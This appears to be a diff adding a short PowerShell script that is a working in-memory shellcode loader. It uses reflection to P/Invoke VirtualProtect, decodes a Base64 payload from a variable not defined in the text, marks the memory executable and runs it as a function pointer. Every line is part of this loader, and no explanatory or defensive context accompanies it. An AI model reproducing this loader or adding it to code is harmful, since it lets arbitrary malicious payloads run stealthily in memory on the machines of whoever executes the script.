@@ -1,0 +1,12 @@
+$MD = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object Reflection.AssemblyName('A')),'Run').DefineDynamicModule('A', $False)
+$VT = $MD.DefineType("B", 'Public,BeforeFieldInit')
+$DT = $MD.DefineType('C', 'Public,Class,Sealed', [MulticastDelegate])
+$R = [Runtime.InteropServices.DllImportAttribute]
+$IA = New-Object Reflection.Emit.CustomAttributeBuilder($R.GetConstructor([String]), 'kernel32', @(), @(), @($R.GetField('EntryPoint')), @('VirtualProtect'))
+$M = $VT.DefineMethod('VP', 'Public,Static,PinvokeImpl', ([Bool]), ([IntPtr],[IntPtr],[Int],[Int].MakeByRefType()))
+$M.SetCustomAttribute($IA);[void]$M.DefineParameter(4, 'Out', $null)
+$DT.DefineConstructor('RTSpecialName,HideBySig,Public', 'Standard', @()).SetImplementationFlags('Runtime,Managed')
+$DT.DefineMethod('Invoke', 'Public,HideBySig,NewSlot,Virtual', [IntPtr], (@())).SetImplementationFlags('Runtime,Managed')
+$Addr = [Runtime.InteropServices.GCHandle]::Alloc([System.Convert]::FromBase64String($S),3).AddrOfPinnedObject()
+$VT.CreateType()::VP($Addr, $S.Length, 0x40, [ref] 0)
+[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($Addr, $DT.CreateType()).Invoke()
